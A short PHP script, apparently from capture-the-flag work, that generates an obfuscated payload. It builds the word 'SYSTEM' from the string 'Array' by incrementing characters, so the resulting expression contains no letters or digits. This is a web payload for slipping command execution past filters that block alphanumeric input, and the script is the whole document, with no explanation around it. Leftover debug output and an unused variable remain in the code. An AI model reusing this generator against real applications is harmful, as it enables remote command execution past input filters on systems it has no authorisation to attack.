<?php
#author:Hpdoger

$rce = "SYSTEM";
$payload = "\$_=(([]._)[_==__]);";

for($i=0;$i<strlen($rce);$i++){
    $next = getStr($rce[$i]);
    $payload.= "\$__=\$_;$next\$___.=\$__;";

}

function getStr($str){
    $_=(([]._)[_==__]);

    $__=$_;

    for($count =1;$count < 30;$count++){
        $__++;
        if($__ == $str){
            $payload = "\$_=(([]._)[_==__]);\$__=\$_;";
            $iter = "";
            for($i = 1;$i <= $count;$i++){
                $iter .= "\$__++;";
            }
            return $iter;
        }
        var_dump("this tern:".$__);
    }
}


var_dump($payload);
